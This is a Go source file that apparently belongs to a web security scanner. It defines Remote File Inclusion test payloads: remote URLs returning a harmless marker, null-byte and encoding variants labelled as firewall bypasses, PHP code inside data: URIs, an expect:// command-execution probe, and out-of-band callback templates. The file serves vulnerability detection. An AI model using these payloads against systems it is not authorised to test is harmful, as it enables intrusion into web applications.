// Package rfi provides payloads for Remote File Inclusion detection.
package rfi

// Protocol represents the protocol used in RFI payloads.
type Protocol string

const (
	ProtocolHTTP  Protocol = "http"
	ProtocolHTTPS Protocol = "https"
	ProtocolFTP   Protocol = "ftp"
	ProtocolData  Protocol = "data"
)

// Payload represents an RFI payload.
type Payload struct {
	Value       string
	Protocol    Protocol
	Description string
	WAFBypass   bool
	Patterns    []string // Patterns to detect in response
}

// Remote test servers for RFI detection (public test endpoints)
const (
	// Using httpbin for detection (returns predictable content)
	HTTPBinBase64    = "http://httpbin.org/base64/UkZJVEVTVA==" // Returns "RFITEST"
	HTTPBinGet       = "http://httpbin.org/get"
	HTTPBinUserAgent = "http://httpbin.org/user-agent"
)

var payloads = []Payload{
	// Basic HTTP RFI
	{Value: "http://httpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTP, Description: "HTTP RFI to httpbin", Patterns: []string{"RFITEST"}},
	{Value: "http://httpbin.org/get", Protocol: ProtocolHTTP, Description: "HTTP RFI to httpbin/get", Patterns: []string{"httpbin.org", "args"}},
	{Value: "https://httpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTPS, Description: "HTTPS RFI to httpbin", Patterns: []string{"RFITEST"}},

	// Null byte bypass (for older PHP)
	{Value: "http://httpbin.org/base64/UkZJVEVTVA==%00", Protocol: ProtocolHTTP, Description: "HTTP RFI with null byte", WAFBypass: true, Patterns: []string{"RFITEST"}},
	{Value: "http://httpbin.org/base64/UkZJVEVTVA==%00.php", Protocol: ProtocolHTTP, Description: "HTTP RFI null byte php extension", WAFBypass: true, Patterns: []string{"RFITEST"}},

	// URL encoding bypass
	{Value: "http%3A%2F%2Fhttpbin.org%2Fbase64%2FUkZJVEVTVA%3D%3D", Protocol: ProtocolHTTP, Description: "URL encoded RFI", WAFBypass: true, Patterns: []string{"RFITEST"}},
	{Value: "http:%2f%2fhttpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTP, Description: "Partial URL encoded RFI", WAFBypass: true, Patterns: []string{"RFITEST"}},

	// Double URL encoding
	{Value: "http%253A%252F%252Fhttpbin.org%252Fbase64%252FUkZJVEVTVA%253D%253D", Protocol: ProtocolHTTP, Description: "Double URL encoded RFI", WAFBypass: true, Patterns: []string{"RFITEST"}},

	// Data URI (for PHP data:// wrapper)
	{Value: "data://text/plain,RFITEST", Protocol: ProtocolData, Description: "Data URI plain text", Patterns: []string{"RFITEST"}},
	{Value: "data://text/plain;base64,UkZJVEVTVA==", Protocol: ProtocolData, Description: "Data URI base64", Patterns: []string{"RFITEST"}},
	{Value: "data:text/plain,<?php echo 'RFITEST'; ?>", Protocol: ProtocolData, Description: "Data URI PHP code", Patterns: []string{"RFITEST"}},
	{Value: "data:text/plain;base64,PD9waHAgZWNobyAnUkZJVEVTVCc7ID8+", Protocol: ProtocolData, Description: "Data URI base64 PHP", Patterns: []string{"RFITEST"}},

	// PHP expect wrapper
	{Value: "expect://id", Protocol: ProtocolData, Description: "PHP expect wrapper", Patterns: []string{"uid=", "gid="}},
	{Value: "expect://echo RFITEST", Protocol: ProtocolData, Description: "PHP expect echo", Patterns: []string{"RFITEST"}},

	// PHP input wrapper (requires POST data)
	{Value: "php://input", Protocol: ProtocolData, Description: "PHP input wrapper", Patterns: []string{"RFITEST"}},

	// WAF bypass variations
	{Value: "hTtP://httpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTP, Description: "Mixed case HTTP", WAFBypass: true, Patterns: []string{"RFITEST"}},
	{Value: "HTTP://httpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTP, Description: "Uppercase HTTP", WAFBypass: true, Patterns: []string{"RFITEST"}},
	{Value: "//httpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTP, Description: "Protocol-relative URL", WAFBypass: true, Patterns: []string{"RFITEST"}},

	// FTP protocol
	{Value: "ftp://anonymous:anonymous@ftp.example.com/test.txt", Protocol: ProtocolFTP, Description: "FTP anonymous", Patterns: []string{}},

	// Filter bypass with double slashes
	{Value: "http:////httpbin.org/base64/UkZJVEVTVA==", Protocol: ProtocolHTTP, Description: "Double slash bypass", WAFBypass: true, Patterns: []string{"RFITEST"}},
}

// OOBPayload represents an out-of-band RFI payload.
type OOBPayload struct {
	Template    string
	Protocol    Protocol
	Description string
}

var oobPayloads = []OOBPayload{
	{Template: "http://{CALLBACK}/rfi", Protocol: ProtocolHTTP, Description: "HTTP callback"},
	{Template: "https://{CALLBACK}/rfi", Protocol: ProtocolHTTPS, Description: "HTTPS callback"},
	{Template: "ftp://{CALLBACK}/rfi", Protocol: ProtocolFTP, Description: "FTP callback"},
	{Template: "http://{CALLBACK}/rfi?file=test", Protocol: ProtocolHTTP, Description: "HTTP callback with param"},
}

// GetPayloads returns all RFI payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetWAFBypassPayloads returns only WAF bypass payloads.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetByProtocol returns payloads for a specific protocol.
func GetByProtocol(protocol Protocol) []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Protocol == protocol {
			result = append(result, p)
		}
	}
	return result
}

// GetOOBPayloads returns out-of-band RFI payloads.
func GetOOBPayloads() []OOBPayload {
	return oobPayloads
}
